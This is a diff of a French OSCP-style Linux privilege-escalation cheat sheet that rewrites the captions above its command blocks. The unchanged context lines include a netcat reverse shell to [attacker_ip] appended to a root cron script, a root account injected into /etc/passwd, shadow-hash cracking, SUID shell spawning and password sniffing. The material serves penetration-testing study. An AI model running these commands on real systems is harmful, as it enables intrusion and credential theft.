@@ -14,7 +14,7 @@ Examiner les permissions, processus et configurations d'un système Linux.
 **Current user**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil id.</p>
+<p class="oscp-command-note">Afficher l&#x27;identité Unix et les groupes.</p>
 
 ```text
 id
@@ -24,7 +24,7 @@ id
 **Hostname**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil hostname.</p>
+<p class="oscp-command-note">Afficher le nom de la machine.</p>
 
 ```text
 hostname
@@ -34,7 +34,7 @@ hostname
 **OS versions and architecture**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil cat.</p>
+<p class="oscp-command-note">Lire un fichier.</p>
 
 ```text
 cat /etc/issue
@@ -46,7 +46,7 @@ cat /etc/os-release
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil uname.</p>
+<p class="oscp-command-note">Afficher le système et la version du noyau.</p>
 
 ```text
 uname -a
@@ -56,7 +56,7 @@ uname -a
 **Running processes**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil ps.</p>
+<p class="oscp-command-note">Afficher les processus actifs.</p>
 
 ```text
 ps aux
@@ -66,14 +66,14 @@ ps aux
 **Network interfaces, routes, connections, open ports**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil ip.</p>
+<p class="oscp-command-note">Examiner les interfaces et routes réseau.</p>
 
 ```text
 ip a
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil ss.</p>
+
 
 ```text
 ss -anp
@@ -83,7 +83,7 @@ ss -anp
 **Firewall rules**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil cat.</p>
+<p class="oscp-command-note">Lire un fichier.</p>
 
 ```text
 cat /etc/iptables/rules.v4
@@ -93,14 +93,14 @@ cat /etc/iptables/rules.v4
 **Scheduled cron tasks**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil ls.</p>
+<p class="oscp-command-note">Lister les fichiers du répertoire.</p>
 
 ```text
 ls -lah /etc/cron*
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil crontab.</p>
+
 
 ```text
 crontab -l
@@ -115,7 +115,7 @@ sudo crontab -l
 **Installed applications**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil dpkg.</p>
+<p class="oscp-command-note">Examiner ou gérer les paquets installés.</p>
 
 ```text
 dpkg -l
@@ -129,7 +129,7 @@ dpkg -l
 **Sensitive writable files (excluding /dev/null )**
 
 
-<p class="oscp-command-note">Rechercher ou filtrer des données.</p>
+<p class="oscp-command-note">Rechercher des fichiers selon un filtre.</p>
 
 ```text
 find / -writable -type d 2>/dev/null
@@ -139,7 +139,7 @@ find / -writable -type d 2>/dev/null
 **In memory passwords**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil strings.</p>
+<p class="oscp-command-note">Rechercher les chaînes de caractères lisibles.</p>
 
 ```text
 strings /dev/mem -n10 | grep -i PASS
@@ -149,7 +149,7 @@ strings /dev/mem -n10 | grep -i PASS
 **Find sensitive files**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil locate.</p>
+
 
 ```text
 locate password | more
@@ -159,21 +159,21 @@ locate password | more
 **Mounted drives**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil cat.</p>
+<p class="oscp-command-note">Lire un fichier.</p>
 
 ```text
 cat /etc/fstab
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil mount.</p>
+
 
 ```text
 mount
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil lsblk.</p>
+
 
 ```text
 lsblk
@@ -183,14 +183,14 @@ lsblk
 **Device drivers and kernel modules**
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil lsmod.</p>
+
 
 ```text
 lsmod
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil /sbin/modinfo.</p>
+
 
 ```text
 /sbin/modinfo <driver_name>
@@ -200,21 +200,21 @@ lsmod
 **SUID binaries**
 
 
-<p class="oscp-command-note">Rechercher ou filtrer des données.</p>
+<p class="oscp-command-note">Rechercher des fichiers selon un filtre.</p>
 
 ```text
 find / -perm -u=s -type f 2>/dev/null
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil -l.</p>
+
 
 ```bash
 sudo -l
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil -i.</p>
+
 
 ```bash
 sudo -i
@@ -231,7 +231,7 @@ sudo -i
 ## Examiner les services
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil watch.</p>
+
 
 ```bash
 watch -n 1 "ps -aux | grep pass"
@@ -242,7 +242,7 @@ watch -n 1 "ps -aux | grep pass"
 `tcpdump`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil tcpdump.</p>
+
 
 ```bash
 sudo tcpdump -i lo -A | grep "pass"
@@ -261,7 +261,7 @@ tcpdump -vv -i eth0 src not 10.11.1.111 and dst not 10.11.1.111
 Examiner les permissions et la configuration de Linux.
 
 
-<p class="oscp-command-note">Rechercher ou filtrer des données.</p>
+<p class="oscp-command-note">Rechercher un motif textuel.</p>
 
 ```bash
 grep "CRON" /var/log/syslog
@@ -270,21 +270,21 @@ cat /var/log/cron.log
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil ls.</p>
+<p class="oscp-command-note">Lister les fichiers du répertoire.</p>
 
 ```bash
 ls -lah /path/to/script.sh
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil echo.</p>
+<p class="oscp-command-note">Afficher ou écrire une valeur.</p>
 
 ```bash
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [attacker_ip] [listener_port] >/tmp/f" >> /path/to/script.sh
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil crontab.</p>
+<p class="oscp-command-note">Script shell dans la rubrique « Tâches cron ».</p>
 
 ```bash
 crontab -l
@@ -305,7 +305,7 @@ cat /var/spool/cron/crontabs/root
 ### /etc/passwd
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil openssl.</p>
+<p class="oscp-command-note">Examiner une connexion TLS ou un certificat.</p>
 
 ```bash
 openssl passwd Password123
@@ -316,7 +316,7 @@ openssl passwd Password123
 `/etc/passwd`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil echo.</p>
+
 
 ```bash
 # This is just an example using the output of the previous command.
@@ -324,7 +324,7 @@ echo"newroot:$6$rounds=656000$6B8ZJQ4aK7G9P/8c$hx0E6ke7zxz1mUMN6LCyRJp2bV5hEE7Eo
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil su.</p>
+<p class="oscp-command-note">Script shell dans la rubrique « /etc/passwd ».</p>
 
 ```bash
 su newroot
@@ -337,14 +337,14 @@ id
 ### /etc/shadow
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil cat.</p>
+<p class="oscp-command-note">Lire un fichier.</p>
 
 ```bash
 cat /etc/shadow | grep [root_user] > [root_user]_hash.txt
 ```
 
 
-<p class="oscp-command-note">Analyser une empreinte avec le mode indiqué.</p>
+<p class="oscp-command-note">Analyser des empreintes avec John.</p>
 
 ```bash
 # John The Ripper
@@ -367,14 +367,14 @@ hashcat -m 1800 [root_user]_hash.txt /usr/share/wordlists/rockyou.txt --show
 ### Binaires SUID
 
 
-<p class="oscp-command-note">Rechercher ou filtrer des données.</p>
+<p class="oscp-command-note">Rechercher des fichiers selon un filtre.</p>
 
 ```bash
 find / -perm -4000 -type f 2>/dev/null
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil ls.</p>
+<p class="oscp-command-note">Lister les fichiers du répertoire.</p>
 
 ```bash
 ls -l $(find / -perm -4000 -type f 2>/dev/null)
@@ -384,14 +384,14 @@ ls -l $(find / -perm -4000 -type f 2>/dev/null)
 ### Exploiting Setuid Binaries
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil ps.</p>
+<p class="oscp-command-note">Afficher les processus actifs.</p>
 
 ```bash
 ps u -C [binary_name]
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil cat.</p>
+<p class="oscp-command-note">Lire un fichier.</p>
 
 ```bash
 cat /proc/[PID]/status | grep Uid
@@ -402,7 +402,7 @@ cat /proc/[PID]/status | grep Uid
 `find`  
 
 
-<p class="oscp-command-note">Rechercher ou filtrer des données.</p>
+<p class="oscp-command-note">Rechercher des fichiers selon un filtre.</p>
 
 ```bash
 find [directory] -exec [path_to_shell] \;
@@ -418,14 +418,14 @@ find / -name [vulnerable_binary] -exec /bin/bash -p \;
 ### Capabilities
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil /usr/sbin/getcap.</p>
+
 
 ```bash
 /usr/sbin/getcap -r / 2>/dev/null
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil getcap.</p>
+<p class="oscp-command-note">Script shell dans la rubrique « Capabilities ».</p>
 
 ```bash
 getcap [binary_path]
@@ -435,7 +435,7 @@ getcap /usr/bin/nmap
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil setcap.</p>
+
 
 ```bash
 setcap [capabilities] [binary_path]
@@ -512,14 +512,14 @@ Bypasses file and directory read and execute permission checks. · Allows readin
 Examiner les permissions et la configuration de Linux.
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil -l.</p>
+
 
 ```bash
 sudo -l
 ```
 
 
-<p class="oscp-command-note">Rechercher ou filtrer des données.</p>
+<p class="oscp-command-note">Rechercher un motif textuel.</p>
 
 ```bash
 grep [process_name] /var/log/syslog
@@ -597,7 +597,7 @@ DirtyPipe · Linux Kernel 5.8 < 5.16.11 · Exploit
 ## Wildcard Exploitation
 
 
-<p class="oscp-command-note">Exemple technique pour la rubrique « Wildcard Exploitation ».</p>
+
 
 ```text
 *
@@ -617,14 +617,14 @@ DirtyPipe · Linux Kernel 5.8 < 5.16.11 · Exploit
 ### Exploiting Wildcards in Exécution de commandes
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil ls.</p>
+<p class="oscp-command-note">Lister les fichiers du répertoire.</p>
 
 ```bash
 ls /var/log/*
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil tar.</p>
+
 
 ```bash
 # Example vulnerable script
@@ -635,14 +635,14 @@ tar -cvf archive.tar.gz /var/log/*
 ### Exploiting Wildcards in File Operations
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil touch.</p>
+
 
 ```bash
 touch /tmp/file_*
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil cp.</p>
+<p class="oscp-command-note">Copier les fichiers indiqués.</p>
 
 ```bash
 # If an attacker can modify files in /etc/, they could exploit the wildcard to overwrite or manipulate critical configuration files.
@@ -653,7 +653,7 @@ cp /etc/* /tmp/backup/
 ## Disk Group Permissions
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil df.</p>
+
 
 ```text
 df -h #Find where "/" is mounted
@@ -670,7 +670,7 @@ debugfs: cat /etc/shadow
 Examiner les connexions, la configuration et les requêtes de la base de données.
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil select.</p>
+<p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>
 
 ```sql
 select sys_exec('whoami');
@@ -681,7 +681,7 @@ select sys_eval('whoami');
 ## User-Installed Software
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil /usr/local/.</p>
+<p class="oscp-command-note">Script shell dans la rubrique « User-Installed Software ».</p>
 
 ```bash
 /usr/local/
@@ -694,7 +694,7 @@ select sys_eval('whoami');
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil dpkg.</p>
+<p class="oscp-command-note">Examiner ou gérer les paquets installés.</p>
 
 ```bash
 # Debian/Ubuntu
@@ -717,7 +717,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 `config.php`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil root.</p>
+<p class="oscp-command-note">Script shell dans la rubrique « Weak, Reused, and Plaintext Passwords ».</p>
 
 ```bash
 root:root
@@ -730,7 +730,7 @@ username:password
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil /var/mail.</p>
+
 
 ```bash
 # Anything interesting in the mail folder?
@@ -739,7 +739,7 @@ username:password
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil ./linenum.sh.</p>
+
 
 ```bash
 ./LinEnum.sh -t -k password
@@ -749,7 +749,7 @@ username:password
 ### Connexions réseau actives
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil netstat.</p>
+<p class="oscp-command-note">Examiner les ports et connexions réseau.</p>
 
 ```bash
 # List network services
@@ -761,7 +761,7 @@ netstat -ano
 ## World-Writable Scripts Invoked as Root
 
 
-<p class="oscp-command-note">Rechercher ou filtrer des données.</p>
+<p class="oscp-command-note">Rechercher des fichiers selon un filtre.</p>
 
 ```bash
 # World-writable directories
@@ -780,7 +780,7 @@ find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
 ## Unmounted FileSystems
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil mount.</p>
+
 
 ```bash
 mount -l
@@ -803,7 +803,7 @@ Examiner les permissions et la configuration de Linux.
 Examiner les permissions et la configuration de Linux.
 
 
-<p class="oscp-command-note">Rechercher ou filtrer des données.</p>
+<p class="oscp-command-note">Rechercher des fichiers selon un filtre.</p>
 
 ```bash
 # Find SUID files
@@ -817,7 +817,7 @@ find / -perm -g=s -type f 2>/dev/null
 ### Determining Exploitability
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil strings.</p>
+<p class="oscp-command-note">Rechercher les chaînes de caractères lisibles.</p>
 
 ```bash
 # Option 1: Use strings to examine the contents.
@@ -839,7 +839,7 @@ export PATH=/tmp:$PATH
 ```
 
 
-<p class="oscp-command-note">Rechercher ou filtrer des données.</p>
+<p class="oscp-command-note">Rechercher des fichiers selon un filtre.</p>
 
 ```bash
 # Find writable SUID files
@@ -862,14 +862,14 @@ find /etc/cron* /var/spool/cron/ -perm -u=s -type f 2>/dev/null
 `./linpeas.sh`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil ./linpeas.sh.</p>
+
 
 ```bash
 ./linpeas.sh | tee linpeas_output.txt
 ```
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil python3.</p>
+<p class="oscp-command-note">Exécuter un script Python.</p>
 
 ```bash
 # 1. Download file from victim to local Kali, we could use techniques from section 17.
@@ -888,7 +888,7 @@ python3 json2pdf.py peass.json peass.pdf
 ### LinEnum
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil ./linenum.sh.</p>
+<p class="oscp-command-note">Script shell dans la rubrique « LinEnum ».</p>
 
 ```bash
 ./LinEnum.sh
@@ -910,7 +910,7 @@ python3 json2pdf.py peass.json peass.pdf
 `./unix-privesc-check.sh`  
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil ./unix-privesc-check.sh.</p>
+
 
 ```bash
 ./unix-privesc-check.sh | tee unix_privesc_check_output.txt
@@ -920,7 +920,7 @@ python3 json2pdf.py peass.json peass.pdf
 ### Checksec
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil checksec.</p>
+
 
 ```bash
 checksec --all
@@ -930,7 +930,7 @@ checksec --all
 ### Peepdf
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil peepdf.py.</p>
+
 
 ```bash
 peepdf.py file.pdf
@@ -940,7 +940,7 @@ peepdf.py file.pdf
 ### Exploit Suggester
 
 
-<p class="oscp-command-note">Exemple avec l&#x27;outil python3.</p>
+<p class="oscp-command-note">Exécuter un script Python.</p>
 
 ```bash
 python3 exploit-suggester.py
